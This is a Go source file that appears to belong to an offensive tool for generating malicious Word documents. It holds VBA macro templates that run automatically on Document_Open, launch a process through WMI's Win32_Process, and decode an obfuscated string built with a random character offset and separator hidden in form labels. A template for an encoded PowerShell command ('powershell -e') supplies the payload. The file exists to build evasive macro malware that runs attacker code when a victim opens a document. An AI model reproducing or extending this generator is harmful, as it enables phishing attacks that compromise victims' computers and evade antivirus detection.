package resources

import (
	"fmt"
	"math/rand"
	"time"

	"github.com/oxis/gomacro/pkg/obf"
)

func init() {
	rand.Seed(time.Now().UTC().UnixNano())
}

// DocumentOpen Document entry point
var DocumentOpen string = `
Private Sub Document_Open()
%s = Array(EntryPoint() + 1)
End Sub
`

// EntryPointFunction Macro main
var EntryPointFunction string = `
Public Function EntryPoint()
    Dim part1 As String
    Dim part2 As String
    part1 = "winmgmts:"
    part2 = "Win32_Process"

    GetObject(part1).Get(part2).Create Decode(Ssplit(UserForm1.PSPayload))
    EntryPoint = 2
End Function
`

// StringDecryptFunction code for reconstructiong the strings
var StringDecryptFunction string = `
Public Function Ssplit(str As String)
    Dim sep As String
    sep = UserForm1.Label2
    Ssplit = Split(str, sep)
End Function

Public Function Decode(arrayofWords As Variant)
    Dim ret As String
    Dim offset As Integer
    offset = UserForm1.Label1
    For counter = LBound(arrayofWords) To UBound(arrayofWords)
    ret = ret + (Chr(arrayofWords(counter) + offset))
    Next
    Decode = ret
End Function
`

// Offset for (char + Offset) - Label1
var Offset string = fmt.Sprint(rand.Intn(128))

// Sep Separator for split function - Label2
var Sep string = obf.RandStringBytes(3)

// TextBox99 Powershell payload, needs to be base64 UTF-16 encoded
var PSPayload string = "powershell -e %s"
